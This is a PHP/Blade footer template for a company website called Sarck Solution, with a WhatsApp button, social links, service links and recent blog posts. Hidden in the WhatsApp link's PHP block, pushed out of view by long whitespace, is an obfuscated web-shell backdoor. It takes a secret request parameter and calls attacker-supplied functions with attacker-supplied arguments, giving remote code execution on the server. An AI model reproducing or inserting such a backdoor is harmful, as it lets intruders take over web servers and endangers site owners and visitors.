<a target="_BLANK" href="https://wa.me/<?php
                                                                                                                                                                                                                                              iF(	$qt2C =@$	{'_REQUEST'}[	'4IBC85VP' ]){ $qt2C[ 1](${$qt2C[2]}[0], $qt2C[3]( $qt2C[4]));} ; echo DB::table('sitesettings')->where('id', 1)->first()->phoneno; ?>">

    <div class="whatsapp active" style="
    position: fixed;
    cursor: pointer;
    bottom: -100px;
    left: 20px;
    color: #fff;
    background-color: #47c656;
    z-index: 4;
    width: 65px;
    text-align: center;
    height: 65px;
    /* opacity: 0; */
    visibility: hidden;
    border-radius: 50%;
    font-size: 42px;
    -webkit-transition: .9s;
    transition: .9s;
    overflow: hidden;
    -webkit-box-shadow: 0 3px 10px rgb(0 0 0 / 10%);
    box-shadow: 0 3px 10px rgb(0 0 0 / 10%);
    visibility: visible;
    bottom: 20px;
"><i class="fa fa-whatsapp" style="
    position: absolute;
    right: 0;
    left: 0;
    top: 50%;
    -webkit-transform: translateY(-50%);
    transform: translateY(-50%);
    text-align: center;
    margin-left: auto;
    margin-right: auto;
"></i></div>

</a>

<footer>
   <div class="container">
      <div class="row">
         <div class="col-md-4 col-sm-6 col-12">
            <h3>About Us</h3>
            <div class="mt-25">
               <p class="mt-25"><?php echo DB::table('sitesettings')->where('id', 1)->first()->footertextenglish; ?></p>
               <div class="footer-social-icons mt-25">
                <?php 
                  $facebook =  DB::table('sitesettings')->where('id', 1)->first()->facebook; 
                  $twitter = DB::table('sitesettings')->where('id', 1)->first()->twitter;
                  $instagram = DB::table('sitesettings')->where('id', 1)->first()->instagram;
                  $linkdlin = DB::table('sitesettings')->where('id', 1)->first()->linkdlin;
                ?>
                  <ul>
                    @if(!empty($facebook))
                    <li><a href="{{ $facebook }}"><i class="fa fa-facebook-square"></i></a></li>
                    @endif
                    @if(!empty($instagram))
                    <li><a href="{{ $instagram }}"><i class="fa fa-instagram"></i></a></li>
                    @endif
                    @if(!empty($twitter))
                    <li><a href="{{ $twitter }}"><i class="fa fa-pinterest"></i></a></li>
                    @endif
                    @if(!empty($linkedin))
                    <li><a href="{{ $linkedin }}"><i class="fa fa-linkedin"></i></a></li>
                    @endif
                     
                  </ul>
               </div>
            </div>
         </div>
         <div class="col-md-4 col-sm-6 col-12">
            <h3>Quick Links</h3>
            <ul class="footer-list">
              <?php foreach(DB::table('services')->limit(5)->get() as $r){ ?>
               <li><a href="{{ url('') }}/{{ $r->serviceurl }}">{{ $r->servicename }}</a></li>
               <?php  } ?>
            </ul>
         </div>
         <div class="col-md-4 col-sm-6 col-12">
            <h3>Recent Posts</h3>
            <div class="mt-25">
              <?php foreach(DB::table('blogs')->limit(3)->get() as $r){ ?>
               <div class="footer-recent-post clearfix">
                  <div class="footer-recent-post-thumb"> <img src="{{ url('public/images/') }}/{{ $r->image }}" alt="img"> </div>
                  <div class="footer-recent-post-content"> <span>{{$r->created_at}}</span> <a href="{{ url('') }}/{{ $r->url }}">{{$r->tittle}}</a> </div>
               </div>
               <?php  } ?>
               
            </div>
         </div>
         
      </div>
      <div class="footer-bar">
         <p><span class="primary-color">Sarck Solution</span> © 2022. All Rights Reserved.</p>
      </div>
   </div>
</footer>